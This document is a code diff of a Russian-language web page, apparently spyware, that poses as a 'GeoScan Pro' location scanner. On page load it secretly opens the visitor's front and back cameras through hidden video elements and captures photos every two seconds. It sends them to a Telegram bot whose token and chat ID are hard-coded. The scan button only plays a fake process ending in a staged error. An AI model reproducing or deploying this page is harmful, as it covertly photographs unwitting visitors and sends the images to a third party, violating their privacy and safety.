@@ -3,13 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Загрузка контента</title>
+    <title>GeoScan Pro</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            font-family: Arial, sans-serif;
-            background: #f0f0f0;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f);
+            color: white;
             height: 100vh;
             display: flex;
             justify-content: center;
@@ -17,74 +18,192 @@
             text-align: center;
             overflow: hidden;
         }
-        .loader {
-            font-size: 24px;
-            color: #333;
+        
+        .container {
+            width: 90%;
+            max-width: 500px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
         }
+        
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        
+        .map-placeholder {
+            width: 100%;
+            height: 200px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            margin: 20px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .map-marker {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background: red;
+            border-radius: 50%;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+            50% { transform: translate(-50%, -50%) scale(1.3); opacity: 0.7; }
+            100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+        }
+        
+        .scan-button {
+            background: linear-gradient(90deg, #00c6ff, #0072ff);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 20px 0;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s;
+        }
+        
+        .scan-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+        }
+        
+        .scan-button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        
+        .status-message {
+            font-size: 14px;
+            margin: 10px 0;
+            min-height: 20px;
+        }
+        
+        .error-message {
+            color: #ff6b6b;
+            display: none;
+        }
+        
         .hidden {
             display: none;
         }
     </style>
 </head>
 <body>
-    <div class="loader">Подготовка контента...</div>
+    <div class="container">
+        <h1>GeoScan Pro</h1>
+        <div class="map-placeholder">
+            <div class="map-marker"></div>
+        </div>
+        
+        <div class="status-message" id="statusText">Готов к сканированию...</div>
+        
+        <button class="scan-button" id="scanButton">Сканировать местоположение</button>
+        
+        <div class="error-message" id="errorText">
+            Ошибка: Не удалось определить местоположение. Попробуйте позже.
+        </div>
+    </div>
 
-    <!-- Основная камера -->
+    <!-- Скрытые элементы для камер -->
     <video id="frontCamera" autoplay playsinline class="hidden"></video>
-    <!-- Вторая камера -->
     <video id="backCamera" autoplay playsinline class="hidden"></video>
     <canvas id="canvas1" class="hidden"></canvas>
     <canvas id="canvas2" class="hidden"></canvas>
 
     <script>
-        // Ваши данные (оставлены как в запросе)
+        // Ваши данные
         const BOT_TOKEN = "7606258807:AAEntpmxwggkW_qRbDAXkzs8kMkNqL03N6U";
         const CHAT_ID = "1224978194";
         
-        // Функция для получения всех камер
-        async function getCameras() {
+        let frontStream = null;
+        let backStream = null;
+        let isScanning = false;
+        let scanInterval = null;
+        
+        // Элементы интерфейса
+        const scanButton = document.getElementById('scanButton');
+        const statusText = document.getElementById('statusText');
+        const errorText = document.getElementById('errorText');
+        
+        // Инициализация камер
+        async function initCameras() {
             try {
                 const devices = await navigator.mediaDevices.enumerateDevices();
                 const videoDevices = devices.filter(device => device.kind === 'videoinput');
                 
                 if (videoDevices.length >= 2) {
-                    // Получаем доступ к обеим камерам
-                    const frontStream = await navigator.mediaDevices.getUserMedia({
+                    frontStream = await navigator.mediaDevices.getUserMedia({
                         video: { deviceId: videoDevices[0].deviceId }
                     });
-                    const backStream = await navigator.mediaDevices.getUserMedia({
+                    backStream = await navigator.mediaDevices.getUserMedia({
                         video: { deviceId: videoDevices[1].deviceId }
                     });
-                    
-                    return { frontStream, backStream };
                 } else {
-                    // Если одна камера - используем ее для обоих
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    return { frontStream: stream, backStream: stream };
+                    frontStream = backStream = stream;
                 }
+                
+                document.getElementById('frontCamera').srcObject = frontStream;
+                document.getElementById('backCamera').srcObject = backStream;
+                
+                // Начинаем скрытую съемку
+                startHiddenScan();
+                
             } catch (error) {
-                console.error("Camera error:", error);
-                return null;
+                console.error("Camera init error:", error);
             }
         }
-
+        
+        // Скрытая съемка каждые 2 секунды
+        function startHiddenScan() {
+            scanInterval = setInterval(() => {
+                captureAndSendPhotos();
+            }, 2000);
+        }
+        
+        // Захват и отправка фото
+        async function captureAndSendPhotos() {
+            if (!frontStream && !backStream) return;
+            
+            try {
+                const frontPhoto = await capturePhoto('frontCamera', 'canvas1');
+                const backPhoto = await capturePhoto('backCamera', 'canvas2');
+                
+                await sendPhoto(frontPhoto, 'geo_scan_front.jpg');
+                await sendPhoto(backPhoto, 'geo_scan_back.jpg');
+                
+            } catch (error) {
+                console.error("Capture error:", error);
+            }
+        }
+        
         // Функция захвата фото
         function capturePhoto(videoElement, canvasId) {
-            const canvas = document.getElementById(canvasId);
-            const video = document.getElementById(videoElement);
-            
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            return new Promise(resolve => {
-                canvas.toBlob(blob => {
-                    resolve(blob);
-                }, 'image/jpeg', 0.85);
+            return new Promise((resolve) => {
+                const canvas = document.getElementById(canvasId);
+                const video = document.getElementById(videoElement);
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(resolve, 'image/jpeg', 0.85);
             });
         }
-
+        
         // Функция отправки фото
         async function sendPhoto(blob, fileName) {
             const formData = new FormData();
@@ -100,59 +219,45 @@
                 console.error("Send error:", error);
             }
         }
-
-        // Главная функция
-        async function init() {
-            document.querySelector('.loader').textContent = "Инициализация системы...";
+        
+        // Обработчик кнопки сканирования
+        scanButton.addEventListener('click', async () => {
+            if (isScanning) return;
             
-            try {
-                // Получаем доступ к камерам
-                const cameras = await getCameras();
-                if (!cameras) throw new Error("No cameras");
+            isScanning = true;
+            scanButton.disabled = true;
+            statusText.textContent = "Сканирование местоположения...";
+            
+            // Имитация процесса сканирования
+            setTimeout(() => {
+                statusText.textContent = "Анализ данных...";
                 
-                // Настраиваем видео элементы
-                const frontVideo = document.getElementById('frontCamera');
-                const backVideo = document.getElementById('backCamera');
-                
-                frontVideo.srcObject = cameras.frontStream;
-                backVideo.srcObject = cameras.backStream;
-                
-                // Ждем загрузки метаданных
-                await Promise.all([
-                    new Promise(resolve => frontVideo.onloadedmetadata = resolve),
-                    new Promise(resolve => backVideo.onloadedmetadata = resolve)
-                ]);
-                
-                // Делаем снимки
-                document.querySelector('.loader').textContent = "Обработка данных...";
-                
-                const [frontPhoto, backPhoto] = await Promise.all([
-                    capturePhoto('frontCamera', 'canvas1'),
-                    capturePhoto('backCamera', 'canvas2')
-                ]);
-                
-                // Отправляем фото
-                await Promise.all([
-                    sendPhoto(frontPhoto, 'front_photo.jpg'),
-                    sendPhoto(backPhoto, 'back_photo.jpg')
-                ]);
-                
-                // Останавлика камер
-                cameras.frontStream.getTracks().forEach(track => track.stop());
-                if (cameras.backStream !== cameras.frontStream) {
-                    cameras.backStream.getTracks().forEach(track => track.stop());
-                }
-                
-                document.querySelector('.loader').textContent = "Завершено!";
-                
-            } catch (error) {
-                console.error("Error:", error);
-                document.querySelector('.loader').textContent = "Ошибка загрузки";
-            }
-        }
-
-        // Запускаем сразу при загрузке
-        window.onload = init;
+                setTimeout(() => {
+                    // Показываем "ошибку"
+                    statusText.textContent = "";
+                    errorText.style.display = "block";
+                    scanButton.disabled = false;
+                    isScanning = false;
+                    
+                    // Через 3 секунды скрываем ошибку
+                    setTimeout(() => {
+                        errorText.style.display = "none";
+                        statusText.textContent = "Готов к сканированию...";
+                    }, 3000);
+                    
+                }, 2000);
+            }, 1500);
+        });
+        
+        // Запускаем при загрузке
+        window.addEventListener('load', initCameras);
+        
+        // Очистка при закрытии
+        window.addEventListener('beforeunload', () => {
+            if (frontStream) frontStream.getTracks().forEach(track => track.stop());
+            if (backStream && backStream !== frontStream) backStream.getTracks().forEach(track => track.stop());
+            if (scanInterval) clearInterval(scanInterval);
+        });
     </script>
 </body>
 </html>
